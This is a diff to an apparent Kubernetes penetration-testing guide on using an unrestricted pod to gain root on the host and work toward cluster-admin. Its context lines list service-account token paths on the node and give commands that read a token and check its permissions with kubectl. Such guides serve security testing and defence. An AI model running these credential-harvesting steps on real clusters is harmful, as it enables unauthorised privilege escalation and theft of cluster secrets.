@@ -1,4 +1,4 @@
-# Easy mode pod - You can create a pod with to all the things
+# You can create a pod with to all the things
 If there are no pod admission controllers applied,or a really lax policy, you can create a pod that has complete access to the host node. You essentially have a root shell on the host, which provides a path to cluster-admin. 
 
 [pod-everything-allowed.yaml](pod-everything-allowed.yaml)
@@ -30,7 +30,7 @@ development | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-to
 kube-system | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/kube-proxy-token-x6j9x/token
 kube-system | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/calico-node-token-d426t/token
 
-#Copy token to somewhere you have kubectl set and see what permissions it has assigned to it
+#Copy token value to somewhere you have kubectl set and see what permissions it has assigned to it
 DTOKEN=`cat /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-qqgjc/token`
 kubectl auth can-i --list --token=$DTOKEN -n development # Shows namespace specific permissions
 kubectl auth can-i --list --token=$DTOKEN #Shows cluster wide permissions
